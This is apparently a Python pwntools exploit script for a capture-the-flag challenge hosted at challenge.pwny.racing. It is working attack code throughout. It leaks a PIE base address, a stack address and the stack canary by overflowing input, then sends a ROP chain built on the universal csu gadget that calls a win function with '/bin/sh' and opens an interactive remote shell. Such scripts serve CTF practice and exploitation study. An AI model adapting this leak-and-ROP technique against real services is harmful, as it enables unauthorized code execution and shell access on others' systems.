#!/usr/bin/python
from pwn import *
import sys
import time

HOST  = 'challenge.pwny.racing'
PORT  = 11540

BASE  = 0xc1d
STACK = 0x130

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

io = remote(HOST, PORT)
print io.recvuntil('5!\n')

# step 1: leak PIE address
io.sendline('x'*0x18)
io.recvuntil('x'*0x18)
leak = io.recvline().strip()
leak = u64(leak.ljust(8, '\x00'))
base = leak - BASE

log.info('leak:      0x%012x' % leak)
log.info('base:      0x%012x' % base)

# step 2: leak stack address
io.sendline('x'*0x40)
io.recvuntil('x'*0x40)
leak = io.recvline().strip()
leak = u64(leak.ljust(8, '\x00'))

stack = leak - STACK
log.info('stack:     0x%012x' % stack)

# step 3: leak canary
io.sendline('x'*0x49)
io.recvuntil('x'*0x49)
canary = io.recvline().strip()[:7]
canary = u64(canary.rjust(8, '\x00'))

log.info('canary: 0x%012x' % canary)

# step 4: rop time, using universal gadget to control rdx
rop  = p64(base+0xc40)     # fini
rop += p64(canary)         # canary
rop += p64(0x00)           # rbp
rop += p64(base+0xc26)     # universal gadget part 1
rop += 'junkjunk'
rop += p64(0x00)           # rbx
rop += p64(0x01)           # rbp
rop += p64(stack+0x40)     # r12 -> stack -> fini
rop += p64(0x00)           # r13 -> rdi
rop += p64(0x00)           # r14 -> rsi
rop += 'SSSSSSSS'          # r15 -> rdx
rop += p64(base+0xc10)     # universal part 2
rop += 'junkjunk'
rop += p64(0x00)           # rbx
rop += p64(base+0x202400)  # rbp
rop += p64(0x00)           # r12
rop += p64(0x00)           # r13
rop += p64(0x00)           # r14
rop += p64(0x00)           # r15
rop += p64(base+0x9ac)     # win(0, 0, "/bin/sh")
rop += p64(base+0xa3a)     # quit()

rop  = rop.replace('SSSSSSSS', p64(stack+len(rop)+0x40))
rop += '/bin/sh\x00'

io.recvuntil(': ')
io.sendline(cyclic(0x40)+rop)

# step 5: trigger
io.recvuntil('buffer: ')
io.sendline('')

# step 6: collect shell
io.sendline('id')
log.success('shell? %s' % io.recvline().strip())
io.interactive()
